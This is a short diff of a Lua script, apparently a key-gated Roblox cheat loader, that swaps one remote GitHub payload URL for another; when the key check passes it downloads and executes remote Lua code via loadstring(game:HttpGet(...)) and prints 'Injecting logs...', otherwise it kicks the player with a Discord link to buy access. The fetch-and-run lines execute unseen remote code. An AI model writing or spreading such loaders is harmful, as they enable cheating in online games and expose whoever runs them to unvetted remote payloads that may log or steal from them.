@@ -6,7 +6,7 @@ if _G.Key == 1 then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/spiderboy764/dontskidladalaw/main/douinky.lua", true))()
         print("Whitelisted Script")
         print("Injecting logs...")
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/tnbian/ruin/main/dontskidlol", true))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/spiderboy764/dontskidladalaw/main/gang.lua", true))()
     else
         plr:kick("Buy at https://discord.gg/YDzcEh6YuU")
     end
